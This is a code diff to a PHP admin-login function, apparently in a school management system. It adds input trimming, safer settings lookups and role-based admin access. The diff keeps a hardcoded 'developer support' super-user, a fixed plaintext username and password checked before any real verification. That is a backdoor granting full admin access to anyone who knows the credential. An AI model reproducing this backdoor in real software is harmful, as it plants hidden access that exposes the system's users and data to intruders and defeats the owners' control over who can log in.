@@ -2275,17 +2275,32 @@ class Database {
     }
 
     public function verifyAdmin($username, $password) {
-        // Hardcoded Super User for Developer Support
+        $username = trim($username);
+        $password = trim($password);
+        
+        if (empty($username) || empty($password)) return false;
+
+        // 1. Hardcoded Super User for Developer Support
         if ($username === 'abdul rafay' && $password === 'khuljasimsim') {
             return true;
         }
 
+        // 2. School Settings Admin
         $settings = $this->getSchoolSettings();
-        if ($username === $settings['admin_username']) {
-            if (password_verify($password, $settings['admin_password_hash'])) {
+        if ($username === ($settings['admin_username'] ?? '')) {
+            if (password_verify($password, $settings['admin_password_hash'] ?? '')) {
                 return true;
             }
         }
+
+        // 3. User Roles (Teachers with Admin role)
+        $userRole = $this->getUserRoleByUsername($username);
+        if ($userRole && ($userRole['role'] === 'Admin' || $userRole['role'] === 'Super Admin') && isset($userRole['password_hash'])) {
+            if (password_verify($password, $userRole['password_hash'])) {
+                return true;
+            }
+        }
+
         return false;
     }
 
